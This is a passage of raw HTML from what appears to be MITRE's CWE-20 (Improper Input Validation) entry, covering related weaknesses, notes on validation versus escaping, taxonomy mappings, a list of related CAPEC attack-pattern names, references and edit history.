class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Compound Element: Chain&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;692&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=692" target="_blank"&gt;Incomplete Blacklist to Cross-Site Scripting&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Variant&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;781&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=781" target="_blank"&gt;Improper Address Validation in IOCTL with METHOD_NEITHER I/O Control Code&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Variant&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;785&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=785" target="_blank"&gt;Use of Path Manipulation Function without Maximum-sized Buffer&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts&lt;/span&gt;699&lt;/span&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Variant&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;789&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=789" target="_blank"&gt;Uncontrolled Memory Allocation&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;MemberOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;635&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=635" target="_blank"&gt;Weaknesses Used by NVD&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses Used by NVD &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;635&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;MemberOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;700&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=700" target="_blank"&gt;Seven Pernicious Kingdoms&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationship Notes"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationship Notes&lt;/div&gt;&lt;div name="oc_20_Relationship Notes" id="oc_20_Relationship Notes" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;CWE-116 and CWE-20 have a close association because, depending on the
nature of the structured message, proper input validation can indirectly
prevent special characters from changing the meaning of a structured
message. For example, by validating that a numeric ID field should only
contain the 0-9 characters, the programmer effectively prevents injection
attacks.&lt;/p&gt;
&lt;p&gt;However, input validation is not always sufficient, especially when less
stringent data types must be supported, such as free-form text. Consider a
SQL injection scenario in which a last name is inserted into a query. The
name "O'Reilly" would likely pass the validation step since it is a common
last name in the English language. However, it cannot be directly inserted
into the database because it contains the "'" apostrophe character, which
would need to be escaped or otherwise handled. In this case, stripping the
apostrophe might reduce the risk of SQL injection, but it would produce
incorrect behavior because the wrong name would be recorded.&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Research Gaps"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Research Gaps&lt;/div&gt;&lt;div name="oc_20_Research Gaps" id="oc_20_Research Gaps" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;There is not much research into the classification of input validation
techniques and their application. Many publicly-disclosed vulnerabilities
simply characterize a problem as "input validation" without providing more
specific details that might contribute to a deeper understanding of
validation techniques and the weaknesses they can prevent or reduce.
Validation is over-emphasized in contrast to other sanitization techniques
such as cleansing and enforcement by conversion. See the vulnerability
theory paper.&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Taxonomy Mappings"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Taxonomy Mappings&lt;/div&gt;&lt;div name="oc_20_Taxonomy Mappings" id="oc_20_Taxonomy Mappings" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Mapped Taxonomy Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Node ID&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Fit&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Mapped Node Name&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;7 Pernicious Kingdoms&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Input validation and representation&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;OWASP Top Ten 2004&lt;/td&gt;&lt;td valign="top"&gt;A1&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE More Specific&lt;/td&gt;&lt;td valign="top"&gt;Unvalidated Input&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;CERT C Secure Coding&lt;/td&gt;&lt;td valign="top"&gt;ERR07-C&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Prefer functions that support error checking over equivalent
functions that don't&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;CERT C Secure Coding&lt;/td&gt;&lt;td valign="top"&gt;INT06-C&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Use strtol() or a related function to convert a string token
to an integer&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;CERT C Secure Coding&lt;/td&gt;&lt;td valign="top"&gt;MEM10-C&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Define and use a pointer validation
function&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;CERT C Secure Coding&lt;/td&gt;&lt;td valign="top"&gt;MSC08-C&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Library functions should validate their
parameters&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;WASC&lt;/td&gt;&lt;td valign="top"&gt;20&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Improper Input Handling &lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Related Attack Patterns"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Related Attack Patterns&lt;/div&gt;&lt;div name="oc_20_Related Attack Patterns" id="oc_20_Related Attack Patterns" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;CAPEC-ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Attack Pattern Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;&lt;div style="font-weight:normal; font-size:85%; font-style:italic; color:#000000"&gt;(CAPEC Version: 1.5)&lt;/div&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org3.html" target="_blank"&gt;3&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Using Leading 'Ghost' Character Sequences to Bypass Input Filters&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org7.html" target="_blank"&gt;7&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Blind SQL Injection&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org8.html" target="_blank"&gt;8&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Buffer Overflow in an API Call&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org9.html" target="_blank"&gt;9&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Buffer Overflow in Local Command-Line Utilities&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org10.html" target="_blank"&gt;10&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Buffer Overflow via Environment Variables&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org13.html" target="_blank"&gt;13&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Subverting Environment Variable Values&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org14.html" target="_blank"&gt;14&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Client-side Injection-induced Buffer Overflow&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org22.html" target="_blank"&gt;22&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Exploiting Trust in Client (aka Make the Client Invisible)&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org24.html" target="_blank"&gt;24&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Filter Failure through Buffer Overflow&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org28.html" target="_blank"&gt;28&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Fuzzing&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org31.html" target="_blank"&gt;31&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Accessing/Intercepting/Modifying HTTP Cookies&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org42.html" target="_blank"&gt;42&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;MIME Conversion&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org43.html" target="_blank"&gt;43&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Exploiting Multiple Input Interpretation Layers&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org88.html" target="_blank"&gt;88&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;OS Command Injection&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org45.html" target="_blank"&gt;45&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Buffer Overflow via Symbolic Links&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org46.html" target="_blank"&gt;46&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Overflow Variables and Tags&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org47.html" target="_blank"&gt;47&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Buffer Overflow via Parameter Expansion&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org52.html" target="_blank"&gt;52&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Embedding NULL Bytes&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org53.html" target="_blank"&gt;53&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Postfix, Null Terminate, and Backslash&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org101.html" target="_blank"&gt;101&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Server Side Include (SSI) Injection&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org64.html" target="_blank"&gt;64&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Using Slashes and URL Encoding Combined to Bypass Validation Logic&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org66.html" target="_blank"&gt;66&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;SQL Injection&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org67.html" target="_blank"&gt;67&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;String Format Overflow in syslog()&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org72.html" target="_blank"&gt;72&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;URL Encoding&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org73.html" target="_blank"&gt;73&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;User-Controlled Filename&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org78.html" target="_blank"&gt;78&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Using Escaped Slashes in Alternate Encoding&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org79.html" target="_blank"&gt;79&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Using Slashes in Alternate Encoding&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org99.html" target="_blank"&gt;99&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;XML Parser Attack&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org83.html" target="_blank"&gt;83&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;XPath Injection&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org85.html" target="_blank"&gt;85&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Client Network Footprinting (using AJAX/XSS)&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org86.html" target="_blank"&gt;86&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Embedding Script (XSS ) in HTTP Headers&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org32.html" target="_blank"&gt;32&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Embedding Scripts in HTTP Query Strings&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org18.html" target="_blank"&gt;18&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Embedding Scripts in Nonscript Elements&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org63.html" target="_blank"&gt;63&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Simple Script Injection&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org71.html" target="_blank"&gt;71&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Using Unicode Encoding to Bypass Validation Logic&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org80.html" target="_blank"&gt;80&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Using UTF-8 Encoding to Bypass Validation Logic&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org81.html" target="_blank"&gt;81&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Web Logs Tampering&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org91.html" target="_blank"&gt;91&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;XSS in IMG Tags&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org104.html" target="_blank"&gt;104&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Cross Zone Scripting&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org106.html" target="_blank"&gt;106&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Cross Site Scripting through Log Files&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org108.html" target="_blank"&gt;108&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Command Line Execution through SQL Injection&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org109.html" target="_blank"&gt;109&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Object Relational Mapping Injection&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org110.html" target="_blank"&gt;110&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;SQL Injection through SOAP Parameter Tampering&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org171.html" target="_blank"&gt;171&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Variable Manipulation&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="References"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;References&lt;/div&gt;&lt;div name="oc_20_References" id="oc_20_References" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;Jim Manico. "Input Validation with ESAPI - Very Important". 2008-08-15. &amp;lt;&lt;a href="http://manicode.blogspot.com/2008/08/input-validation-with-esapi.html" target="_blank"&gt;http://manicode.blogspot.com/2008/08/input-validation-with-esapi.html&lt;/a&gt;&amp;gt;.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;"OWASP Enterprise Security API (ESAPI) Project". &amp;lt;&lt;a href="http://www.owasp.org/index.php/ESAPI" target="_blank"&gt;http://www.owasp.org/index.php/ESAPI&lt;/a&gt;&amp;gt;.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;Joel Scambray, Mike Shema
and Caleb Sima. "Hacking Exposed Web Applications, Second
Edition". Input Validation Attacks. McGraw-Hill. 2006-06-05. &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;Jeremiah Grossman. "Input validation or output filtering, which is
better?". 2007-01-30. &amp;lt;&lt;a href="http://jeremiahgrossman.blogspot.com/2007/01/input-validation-or-output-filtering.html" target="_blank"&gt;http://jeremiahgrossman.blogspot.com/2007/01/input-validation-or-output-filtering.html&lt;/a&gt;&amp;gt;.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;Kevin Beaver. "The importance of input validation". 2006-09-06. &amp;lt;&lt;a href="http://searchsoftwarequality.techtarget.com/tip/0,289483,sid92_gci1214373,00.html" target="_blank"&gt;http://searchsoftwarequality.techtarget.com/tip/0,289483,sid92_gci1214373,00.html&lt;/a&gt;&amp;gt;.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;[REF-11] M. Howard and
D. LeBlanc. "Writing Secure Code". Chapter 10, "All Input Is Evil!" Page 341. 2nd Edition. Microsoft. 2002. &lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Maintenance Notes"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Maintenance Notes&lt;/div&gt;&lt;div name="oc_20_Maintenance Notes" id="oc_20_Maintenance Notes" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;Input validation - whether missing or incorrect - is such an essential and
widespread part of secure development that it is implicit in many different
weaknesses. Traditionally, problems such as buffer overflows and XSS have
been classified as input validation problems by many security professionals.
However, input validation is not necessarily the only protection mechanism
available for avoiding such problems, and in some cases it is not even
sufficient. The CWE team has begun capturing these subtleties in chains
within the Research Concepts view (CWE-1000), but more work is
needed.&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_20_Content History" id="oc_20_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;7 Pernicious Kingdoms&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Potential Mitigations,
Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-08-15&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Veracode&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;Suggested OWASP Top Ten 2004
mapping&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships, Other Notes,
